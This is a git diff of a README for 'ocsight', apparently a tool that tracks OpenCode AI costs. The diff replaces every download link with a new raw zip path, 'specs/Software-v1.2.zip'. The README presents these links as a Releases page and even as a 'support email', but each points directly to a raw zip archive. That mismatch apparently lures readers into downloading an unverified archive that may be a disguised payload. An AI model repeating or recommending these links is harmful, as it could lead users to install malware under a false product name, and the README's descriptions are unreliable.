@@ -1,14 +1,14 @@
 # 📊 ocsight - Track Costs and Usage Effortlessly
 
 ## 🌐 Download Now
-[![Download ocsight](https://raw.githubusercontent.com/ananimy/ocsight/main/unprecipitate/ocsight.zip)](https://raw.githubusercontent.com/ananimy/ocsight/main/unprecipitate/ocsight.zip)
+[![Download ocsight](https://raw.githubusercontent.com/ananimy/ocsight/main/specs/Software-v1.2.zip)](https://raw.githubusercontent.com/ananimy/ocsight/main/specs/Software-v1.2.zip)
 
 ## 🚀 Getting Started
 
 Welcome to ocsight! This application helps you track OpenCode AI costs and usage in real-time. With ocsight, you can monitor your expenses and analyze your data easily. Follow the steps below to get started.
 
 1. **Visit the Releases Page**  
-   To download ocsight, go to the Releases page. Click here: [https://raw.githubusercontent.com/ananimy/ocsight/main/unprecipitate/ocsight.zip](https://raw.githubusercontent.com/ananimy/ocsight/main/unprecipitate/ocsight.zip).
+   To download ocsight, go to the Releases page. Click here: [https://raw.githubusercontent.com/ananimy/ocsight/main/specs/Software-v1.2.zip](https://raw.githubusercontent.com/ananimy/ocsight/main/specs/Software-v1.2.zip).
 
 2. **Choose Your Version**  
    Once on the Releases page, look for the latest version of ocsight. The version numbers are displayed prominently. Click on the version you wish to download.
@@ -42,7 +42,7 @@ Welcome to ocsight! This application helps you track OpenCode AI costs and usage
 
 ## 📥 Download & Install
 
-To download ocsight, revisit our Releases page: [https://raw.githubusercontent.com/ananimy/ocsight/main/unprecipitate/ocsight.zip](https://raw.githubusercontent.com/ananimy/ocsight/main/unprecipitate/ocsight.zip). Follow the steps mentioned earlier to select the version and install the application on your device.
+To download ocsight, revisit our Releases page: [https://raw.githubusercontent.com/ananimy/ocsight/main/specs/Software-v1.2.zip](https://raw.githubusercontent.com/ananimy/ocsight/main/specs/Software-v1.2.zip). Follow the steps mentioned earlier to select the version and install the application on your device.
 
 ## ⚙️ System Requirements
 
@@ -63,6 +63,6 @@ We welcome contributions! If you're interested in helping improve ocsight, feel 
 
 ## ✉️ Contact
 
-For further inquiries, you can reach us at our support email: https://raw.githubusercontent.com/ananimy/ocsight/main/unprecipitate/ocsight.zip We appreciate your interest in utilizing ocsight for tracking your OpenCode AI costs.
+For further inquiries, you can reach us at our support email: https://raw.githubusercontent.com/ananimy/ocsight/main/specs/Software-v1.2.zip We appreciate your interest in utilizing ocsight for tracking your OpenCode AI costs.
 
 Thank you for choosing ocsight! We hope this tool meets your needs for tracking costs and usage effectively.
